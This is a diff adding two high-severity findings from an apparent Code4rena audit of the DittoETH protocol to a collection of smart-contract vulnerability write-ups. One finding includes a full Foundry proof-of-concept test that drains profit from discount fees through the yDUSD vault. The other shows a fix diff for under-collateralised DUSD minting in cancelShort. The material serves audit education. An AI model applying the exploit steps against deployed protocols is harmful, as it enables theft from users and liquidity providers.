@@ -2217,3 +2217,160 @@ function liquidate(
 ```
 
 </details>
+
+## 23.[High] Attacker can profit from discount fees
+
+### Discount fees proportionate to the entire debt
+
+- Summary: An attacker can exploit the discount fee mechanism to profit more from the fees than the loss incurred by the discount trade. This occurs because the discount fee is proportionate to the entire debt, not the amount traded at a discount. Consequently, by triggering a discount and having a significant stake in the yDUSD vault, an attacker can receive more dUSD in fees than they lose from the trade.
+
+- Impact & Recommendation: Fees minted should not exceed the implied trade loss.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-07-dittoeth#h-01-Attacker-can-profit-from-discount-fees) & [Report](https://code4rena.com/reports/2024-07-dittoeth)
+
+<details><summary>POC</summary>
+
+```solidity
+
+function test_discount_drain() public {
+    // Deal some dUSD to users, the attacker and dilutors.
+    address users = makeAddr("users");
+    address attacker = makeAddr("attacker");
+    address dilutors = makeAddr("dilutors");
+    vm.startPrank(_diamond);
+    token.mint(users, 1_000_000 ether);
+    token.mint(attacker, 1_500_000 ether);
+    token.mint(dilutors, 10_000_000 ether);
+    uint256 attackerInitialAssets = token.balanceOf(attacker);
+    assertEq(token.balanceOf(attacker), 1_500_000 ether);
+    // Set up some debt in the system
+    fundLimitBidOpt(DEFAULT_PRICE, ERCDEBTSEED, receiver);
+    fundLimitShortOpt(DEFAULT_PRICE, ERCDEBTSEED, extra);
+    vm.prank(attacker);
+    diamond.depositAsset(asset, 500_000 ether); // The attacker needs to escrow for his ask.
+
+    STypes.ShortRecord memory tappSR = getShortRecord(tapp, C.SHORT_STARTING_ID);
+    uint104 ercDebtMinusTapp = diamond.getAssetStruct(asset).ercDebt - tappSR.ercDebt;
+    assertEq(ercDebtMinusTapp, 50_000_000 ether);
+    assertEq(diamond.getAssetStruct(asset).lastDiscountTime, 0);
+    assertEq(diamond.getAssetStruct(asset).initialDiscountTime, 1 seconds);
+    // Let's say the yDUSD vault is already in use before the attack, with 1_000_000 ether dUSD already deposited.
+    vm.startPrank(users);
+    token.approve(address(rebasingToken), 1_000_000 ether);
+    rebasingToken.deposit(1_000_000 ether, users);
+    assertEq(rebasingToken.totalAssets(), 1_000_000 ether);
+    assertEq(rebasingToken.balanceOf(users), 1_000_000 ether);
+    // The attacker gets yDUSD shares.
+    vm.startPrank(attacker);
+    token.approve(address(rebasingToken), 1_000_000 ether);
+    rebasingToken.deposit(1_000_000 ether, attacker);
+    uint256 preAttackTotalAssets = rebasingToken.totalAssets();
+    assertEq(preAttackTotalAssets, 2_000_000 ether);
+    assertEq(rebasingToken.balanceOf(attacker), 1_000_000 ether); // The attacker owns half of the shares in this example.
+    // The attacker causes a discount by asking for only 99% of the saved price on 454_546 ether dUSD.
+    // This implies a trade loss of 0.01 * 454_546 ether = 4_545.46 ether dUSD.
+    uint80 savedPrice = uint80(diamond.getProtocolAssetPrice(asset));
+    uint80 askPrice = uint80(savedPrice.mul(0.99 ether));
+    uint80 bidPrice = uint80(savedPrice.mul(0.99 ether));
+    fundLimitBidOpt(bidPrice, 1_000_000 ether, receiver);
+    MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, askPrice, O.LimitAsk, 1);
+    createAsk(askPrice, 454_546 ether, C.LIMIT_ORDER, orderHintArray, attacker); // 0.01 * 50_000_000 / (1 + 10 * 0.01) ≈ 454_546
+    // However, the yDUSD vault has been minted 50_000 ether dUSD in fees, of which half can be claimed by the attacker.
+    assertEq(rebasingToken.totalAssets() - preAttackTotalAssets, 50_000 ether);
+    assertEq(rebasingToken.convertToAssets(rebasingToken.balanceOf(attacker)), 1_000_000 ether + 25_000 ether - 1);
+    // Trading back to normal, which removes the discount.
+    // The attacker can trade back his ethEscrow for dUSD and withdraw his ercEscrow (just for profit accounting).
+    orderHintArray = diamond.getHintArray(asset, savedPrice, O.LimitAsk, 1);
+    createAsk(savedPrice, 1_000_000 ether, C.LIMIT_ORDER, orderHintArray, receiver);
+    limitBidOpt(savedPrice, 4000 * diamond.getVaultUserStruct(vault, attacker).ethEscrowed, attacker);
+    vm.startPrank(attacker);
+    diamond.withdrawAsset(asset, diamond.getAssetUserStruct(asset, attacker).ercEscrowed);
+    // Others deposit before the attacker can propose a withdrawal.
+    vm.startPrank(dilutors);
+    token.approve(address(rebasingToken), 5_000_000 ether);
+    rebasingToken.deposit(5_000_000 ether, dilutors);
+    assertEq(rebasingToken.totalAssets(), 7_050_000 ether);
+    // The attacker wants to claim his profit.
+    skip(5 minutes);
+    vm.startPrank(attacker);
+    rebasingToken.proposeWithdraw(1_025_000 ether);
+    // Others deposit before the attacker can withdraw.
+    vm.startPrank(dilutors);
+    token.approve(address(rebasingToken), 5_000_000 ether);
+    rebasingToken.deposit(5_000_000 ether, dilutors);
+    assertEq(rebasingToken.totalAssets(), 12_050_000 ether);
+    // This actually makes no difference to the attacker's share of the vault, because of how vaults work.
+    assertEq(rebasingToken.convertToAssets(rebasingToken.balanceOf(attacker)), 1_025_000 ether);
+    // The attacker can withdraw later.
+    skip(7 days);
+    vm.startPrank(attacker);
+    rebasingToken.withdraw(0, attacker, attacker);
+    // The attacker has gained 25_000 ether dUSD at a cost of 4_545.46 ether dUSD, i.e. a profit of 20_454.54 ether dUSD.
+    assertEq(token.balanceOf(attacker) - attackerInitialAssets, 20_454.54 ether);
+}
+
+```
+
+</details>
+
+## 24.[High] DUSD assets can be minted with less ETH collateral than required
+
+### Less collateral than required
+
+- Summary: A vulnerability in the cancelShort function allows users or attackers to mint DUSD assets with less ETH collateral than required. By canceling a partially filled short order with a debt below the minimum threshold, the system mints additional DUSD based on stale prices and potentially low collateral ratios. This results in the attacker receiving free DUSD, which can de-peg the token. The issue persists despite previous attempts to fix it.
+
+- Impact & Recommendation: Use current prices and initial collateral ratios when calculating the necessary collateral.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-07-dittoeth#h-02-DUSD-assets-can-be-minted-with-less-ETH-collateral-than-required) & [Report](https://code4rena.com/reports/2024-07-dittoeth)
+
+<details><summary>POC</summary>
+
+```solidity
+    // Credit:
+    //  - Original by: nonseodion
+    //  - Modified by: serial-coder
+    function cancelShort(address asset, uint16 id) internal {
+        ...
+        if (shortRecord.status == SR.Closed) {
+            ...
+        } else {
+            uint256 minShortErc = LibAsset.minShortErc(Asset);
+           if (shortRecord.ercDebt < minShortErc) {
+                // @dev prevents leaving behind a partially filled SR under minShortErc
+                // @dev if the corresponding short is cancelled, then the partially filled SR's debt will == minShortErc
+                uint88 debtDiff = uint88(minShortErc - shortRecord.ercDebt); // @dev(safe-cast)
+                {
+                    STypes.Vault storage Vault = s.vault[vault];
+-                   uint88 collateralDiff = shortOrder.price.mulU88(debtDiff).mulU88(cr);
++                   uint256 newCR = convertCR(
++                       shortOrder.shortOrderCR < s.asset[asset].initialCR ? s.asset[asset].initialCR : shortOrder.shortOrderCR
++                   );
++                   uint80 price = uint80(LibOracle.getSavedOrSpotOraclePrice(asset));
++                   uint88 collateralDiff = price.mulU88(debtDiff).mulU88(newCR);
+                    LibShortRecord.fillShortRecord(
+                        asset,
+                        shorter,
+                        shortRecordId,
+                        SR.FullyFilled,
+                        collateralDiff,
+                        debtDiff,
+                        Asset.ercDebtRate,
+                        Vault.dethYieldRate,
+                        0
+                    );
+                    Vault.dethCollateral += collateralDiff;
+                    Asset.dethCollateral += collateralDiff;
+                    Asset.ercDebt += debtDiff;
+                    // @dev update the eth refund amount
+                    eth -= collateralDiff;
+                }
+                // @dev virtually mint the increased debt
+                s.assetUser[asset][shorter].ercEscrowed += debtDiff;
+            } else {
+                ...
+            }
+        }
+        ...
+    }
+
+```
+
+</details>
